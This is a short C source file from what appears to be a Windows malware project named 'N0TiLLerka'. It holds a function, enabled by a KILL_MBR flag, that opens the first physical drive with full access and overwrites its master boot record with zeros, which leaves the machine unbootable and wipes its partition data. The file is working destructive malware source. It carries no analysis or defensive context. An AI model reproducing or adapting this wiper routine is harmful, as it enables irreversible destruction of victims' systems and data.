#include "../../../HeaderFiles/N0TiLLerka.h"

#ifdef KILL_MBR
// at somepoint I might implement a custom MBR displaying a message
#define MBR_SIZE 512

BOOL fnOverwriteMBR(VOID) {
	WCHAR szMbrData[MBR_SIZE];
	ZeroMemory(&szMbrData, sizeof(szMbrData));
	DWORD dwNOBW;

	HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hMbr) {
		if (WriteFile(hMbr, szMbrData, MBR_SIZE, &dwNOBW, NULL)) {
			CloseHandle(hMbr);
			return TRUE;
		} else {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Couldn't overwrite MBR", L"WriteFile", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			CloseHandle(hMbr);
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't open MBR", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}
#endif // KILL_MBR